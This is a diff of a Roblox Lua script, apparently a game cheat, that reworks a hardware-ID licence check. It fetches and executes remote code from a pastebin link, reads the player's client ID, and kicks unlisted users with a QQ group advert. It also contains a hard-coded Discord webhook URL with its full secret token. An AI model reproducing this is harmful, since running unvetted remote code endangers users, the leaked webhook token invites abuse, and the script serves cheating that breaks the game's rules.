@@ -111,22 +111,8 @@ local function startCountdown()
         
  local HIDTable = loadstring(game:HttpGet("https://pastebin.com/raw/63tdYye0"))()
 local HID = game:GetService("RbxAnalyticsService"):GetClientId()
-local authorized = false
-
--- 检查 HID 是否在授权列表中
 for i, v in pairs(HIDTable) do
     if v == HID then
-        authorized = true
-        break  -- 找到匹配后立即跳出循环
-    end
-end
-
-if not authorized then
-    setclipboard("ID:"..HID)
-    game.Players.LocalPlayer:Kick("加qq群:827283128")
-    return  nil
-end
-
   
 local GS_Webhook = "https://discord.com/api/webhooks/1449608485233758409/CsgGTh1VzSxpbM1mxHSApZsN3Hk-vbavoEJQ3xGoV_tMA6V8ghIlsfTekQFVr5mS696H"
 
@@ -346,7 +332,11 @@ MainTab:AddButton({
  
     end
 })
-    
+    else
+        setclipboard("小中脚本-你的ID:"..HID)
+        game.Players.LocalPlayer:Kick("加qq群:827283128")
+    end
+end
 
     end)
 end
